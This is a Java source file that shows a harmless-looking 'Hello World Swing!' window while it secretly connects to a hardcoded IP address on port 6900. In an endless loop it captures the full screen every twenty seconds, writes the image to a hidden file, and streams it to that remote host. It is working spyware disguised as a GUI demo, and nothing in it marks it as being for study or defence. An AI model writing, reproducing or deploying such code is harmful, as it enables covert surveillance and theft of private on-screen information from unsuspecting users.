import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.UIManager;
import javax.swing.UIManager.LookAndFeelInfo;

public class JClient {

	public static void main(String[] args) {
		
		try {
		    for (LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
		        if ("Nimbus".equals(info.getName())) {
		            UIManager.setLookAndFeel(info.getClassName());
		            break;
		        }
		    }
		} catch (Exception e) {
		    // If Nimbus is not available, fall back to cross-platform
		    try {
		        UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
		    } catch (Exception ex) {
		        // not worth my time
		    }
		}
		
		  JFrame frame = new JFrame("Hello World Swing!");
          frame.setSize(500, 400);
          frame.add(new JButton("How are you?"));
          frame.setVisible(true);
          
		try {
			File outputfile = new File(".im.jpg");
			
			Socket client = new Socket("182.237.141.167",6900);
			//System.out.println("Connected To Server JJ");
			DataOutputStream dos = new DataOutputStream(new BufferedOutputStream(client.getOutputStream()));
			Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
			Robot robo = new Robot();
			
			
			while(true){
				BufferedImage bi = robo.createScreenCapture(new Rectangle(screenSize));
				//System.out.println("Clicked");
				ImageIO.write(bi, "jpg", outputfile);
		
				DataInputStream dis = new DataInputStream(new FileInputStream(outputfile));
				copy(dis,dos,outputfile.length());
				dis.close();
				try {
					Thread.sleep(20000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}	
			
		}
		catch(Exception e){
			e.printStackTrace();
			System.exit(1);
		}

	}
	static void copy(DataInputStream dis, DataOutputStream dos,long lenF){
		try{
			
			dos.writeLong(lenF);
			dos.flush();
		
			byte[] buf = new byte[8192];
			int len = 0;
        
	        while (lenF > 0 && (len = dis.read(buf,0,(int)Math.min(buf.length, lenF))) != -1) {
	            dos.write(buf, 0, len);
	            dos.flush();
	            lenF-=len;
	        }
	        
        }catch(Exception e){
        	System.out.println(e);
        	System.exit(1);
        }
    }

}
